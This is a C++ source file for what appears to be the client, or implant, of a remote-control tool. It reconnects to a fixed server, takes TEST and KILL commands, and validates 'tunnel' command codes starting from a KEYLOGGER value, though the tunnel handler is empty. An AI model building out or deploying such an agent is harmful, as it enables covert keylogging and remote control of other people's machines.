#include "client.hpp"

Client::Client(const char* __ip, const int __port): port_(__port), socket_(-1) {
    for (int i=0; i<MAX_IP_LEN; i++) {
        ip_[i] = __ip[i];
        if (__ip[i] == '\0') {
            break;
        }
    }
}

int Client::is_valid_tunnel(CommandCode __tunnel_code) {
    CommandCode code=KEYLOGGER;
    for (int i=0;i<TUNNEL_NUMS;i++) {
        if (code == __tunnel_code) {
            return 0;
        }
        code <<= 1;
    }
    return -1;
}

int Client::init() {
    memset(&server_addr_, 0, sizeof(server_addr_));
    server_addr_.sin_family = AF_INET;
    server_addr_.sin_port = htons(port_);
    if (inet_pton(AF_INET, ip_, &server_addr_.sin_addr) <= 0) {
        printf("[Client] Invalid address or address not supported\n");
        return -1;
    }

    printf("[Client] Initializing successful\n");
    return 0;
}

void Client::start() {
    uint16_t command;
    char buffer[OUT_SIZE];
    int rc;
    int error = 0;
    socklen_t len = sizeof(error);
    CommandCode command_code = 0;
    int command_arg = 0;

    while (!shutdown_flag_) {
        retry_flag_ = false;
        
        socket_ = socket(AF_INET, SOCK_STREAM, 0);
        if (socket_ < 0) {
            printf("[Client] Socket creation failed: %s\n", strerror(errno));
            goto retry;
        }

        if (connect(socket_, (struct sockaddr*)&server_addr_, sizeof(server_addr_)) < 0) {
            if (errno == ECONNREFUSED || errno == ETIMEDOUT) {
                printf("[Client] Trying to connect to the server\n");
                goto retry;
            } else {
                printf("[Client] Connection failed: %s\n", strerror(errno));
                return;
            }
        }
        
        if (getsockopt(socket_, SOL_SOCKET, SO_ERROR, &error, &len) < 0) {
            printf("[Client] Connection verification failed: %s\n", strerror(error));
            goto retry;
        }
        printf("[Client] Connected to server %s:%d\n", ip_, port_);


        while (!shutdown_flag_) {
            rc = recv(socket_, &command, sizeof(command), 0);
            if (rc < 0) {
                printf("[Client] Error receiving data: %s\n", strerror(errno));
                break;
            } else if (rc == 0) {
                printf("[Client] Server closed connection\n");
                break;
            }

            command_code = static_cast<CommandCode>(command >> 8);
            command_arg = static_cast<int>(command & 0x00FF);

            if (command_code == TEST) {
                printf("[Client] Received TEST command\n");
                rc = send_out(socket_, EXEC_SUCCESS);
                if (rc < 0) {
                    printf("[Client] Error sending data: %s\n", strerror(errno));
                    break;
                }
            } else if (command_code == KILL) {
                printf("[Client] Received KILL command\n");
                rc = send_out(socket_, EXEC_SUCCESS);
                if (rc < 0) {
                    printf("[Client] Error sending data: %s\n", strerror(errno));
                    break;
                }
                shutdown_flag_ = true;
                break;
            } else if (is_valid_tunnel(command_code) == 0) {
                
            }
        }
        retry:
            if (!shutdown_flag_) {
                sleep(1);
                if (socket_ >= 0) {
                    close(socket_);
                    socket_ = -1;
                }
            }
    }
}

void Client::shutdown() {
    shutdown_flag_ = true;
    printf("[Client] Shutting down client\n");
    close(socket_);
}